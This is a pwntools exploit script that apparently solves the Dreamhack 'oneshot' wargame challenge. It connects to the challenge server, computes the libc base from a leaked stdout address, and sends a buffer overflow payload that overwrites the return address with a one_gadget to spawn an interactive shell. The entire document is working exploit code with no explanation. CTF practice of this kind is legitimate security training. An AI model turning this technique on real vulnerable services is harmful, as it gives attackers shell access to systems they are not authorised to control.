from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 11128)
e = ELF("./oneshot")
libc = ELF("./libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[:-1], 16)

libcbase = stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget = libcbase + 0x45216

p.recvuntil(b"MSG: ")
payload = b"A" * 0x18 + p64(0) + b"B" * 0x8 + p64(one_gadget)
p.sendline(payload)

p.interactive()
